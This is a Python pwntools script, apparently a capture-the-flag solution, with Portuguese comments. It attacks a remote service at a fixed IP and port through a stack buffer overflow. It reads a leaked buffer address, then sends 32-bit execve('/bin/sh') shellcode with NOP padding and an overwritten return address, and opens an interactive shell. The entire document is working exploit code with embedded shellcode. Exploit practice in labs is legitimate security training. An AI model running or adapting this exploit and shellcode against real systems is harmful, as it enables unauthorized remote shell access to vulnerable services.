from pwn import *

# Configuração remota
host = "100.101.228.35"
port = 5003

# Shellcode (execve /bin/sh)

shellcode = (
    b"\x29\xc0"                        # subl %eax, %eax
    b"\xb0\x47"                        # movb $71, %al
    b"\x29\xdb"                        # subl %ebx, %ebx
    b"\xb3\x0c"                        # movb $12, %bl
    b"\x89\xd9"                        # movl %ebx, %ecx
    b"\xcd\x80"                        # int $0x80
    b"\xeb\x18"                        # jmp callz
    b"\x5e"                            # popl %esi
    b"\x29\xc0"                        # subl %eax, %eax
    b"\x88\x46\x07"                    # movb %al, 0x07(%esi)
    b"\x89\x46\x0c"                    # movl %eax, 0x0c(%esi)
    b"\x89\x76\x08"                    # movl %esi, 0x08(%esi)
    b"\xb0\x0b"                        # movb $0x0b, %al
    b"\x87\xf3"                        # xchgl %esi, %ebx
    b"\x8d\x4b\x08"                    # leal 0x08(%ebx), %ecx
    b"\x8d\x53\x0c"                    # leal 0x0c(%ebx), %edx
    b"\xcd\x80"                        # int $0x80
    b"\xe8\xe3\xff\xff\xff"            # call start
    b"\x2f\x62\x69\x6e\x2f\x73\x68"    # /bin/sh
)

# Conecta ao servidor remoto
r = remote(host, port)
#r = process("./shellcode")
# Passo 1: Selecionar "2 - Compare two strings" para obter o endereço
r.recvuntil(b"> ")
r.sendline(b"2")  # Seleciona a opção 2

# Captura a linha que contém o endereço de depuração
response = r.recvline()
print(response.decode("latin-1"))  # Exibe a linha para depuração

# Extrai o endereço do buffer
buffer_address = int(response.split(b"0x")[1].split(b" ")[0], 16)
log.info(f"Buffer address: {hex(buffer_address)}")

# Passo 2: Enviar as duas strings
r.recvuntil(b"Give me the first string: ")
r.sendline(b"A" * 10)  # Envia a primeira string (arbitrária)
r.recvuntil(b"Give me the second string: ")
r.sendline(b"B" * 10)  # Envia a segunda string (arbitrária)

# Passo 3: Construir o payload
padding = b"\x90" * (112 - len(shellcode))
return_address = p32(buffer_address)  # Formato little-endian
payload = shellcode + padding + return_address 

# Passo 4: Selecionar "1 - String length" para disparar o payload
r.recvuntil(b"> ")
r.sendline(b"1")  # Seleciona a opção 1
r.recvuntil(b"Give me a string: ")
r.sendline(payload)  # Envia o payload

# Interage com o shellls
r.interactive()

